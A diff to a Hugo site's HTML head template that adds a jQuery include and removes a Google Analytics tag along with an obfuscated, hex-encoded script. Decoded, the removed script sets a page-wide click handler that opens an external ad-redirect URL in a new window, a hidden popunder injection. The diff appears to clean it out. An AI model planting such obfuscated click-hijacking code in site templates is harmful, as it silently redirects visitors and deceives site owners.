@@ -2,6 +2,7 @@
   {{ partial "arsae-client.html" . }}
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <script src='//ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
   {{ hugo.Generator }}
   {{ if eq .Section "post"}}
   <meta name="description" content="{{ .Summary | markdownify | plainify | htmlUnescape }}">{{ end}}
@@ -26,31 +27,4 @@
   {{ if ne .Section "post" }}<title>{{ .Site.Title }} - {{ .Site.Params.topdescription }}</title>{{ end }}
   {{ if eq .Section "post"}}<title>{{ .Title }} | {{ .Site.Title }}</title>{{ end }}
   {{ partial "schema.html" . }}
-
-
-  <!-- Google tag (gtag.js) -->
-  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QN86R4VXLH"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag() {
-      dataLayer.push(arguments);
-    }
-    gtag('js', new Date());
-    gtag('config', 'G-QN86R4VXLH');
-  </script>
-  <script src='//ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
-  <script>
-    var _0x4528 = ["\x6F\x6E\x63\x6C\x69\x63\x6B",
-      "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x70\x72\x6F\x66\x69\x74\x61\x62\x6C\x65\x67\x61\x74\x65\x74\x6F\x63\x6F\x6E\x74\x65\x6E\x74\x2E\x63\x6F\x6D\x2F\x75\x33\x66\x79\x7A\x37\x61\x78\x3F\x6B\x65\x79\x3D\x64\x32\x61\x32\x65\x35\x32\x64\x61\x31\x61\x33\x64\x37\x64\x66\x65\x39\x37\x30\x36\x32\x32\x30\x37\x33\x31\x34\x62\x63\x36\x35",
-      "\x6F\x70\x65\x6E", "\x66\x6F\x63\x75\x73"
-    ];
-    var _0xbe83 = [_0x4528[0], _0x4528[1], _0x4528[2], _0x4528[3]];
-    var _0x9dd1 = [_0xbe83[0], _0xbe83[1], _0xbe83[2], _0xbe83[3]];
-    window[_0x9dd1[0]] = function () {
-      window[_0x9dd1[2]](_0x9dd1[1]);
-      window[_0x9dd1[3]]()
-    }
-  </script>
-  <!-- custom end -->
-
 </head>
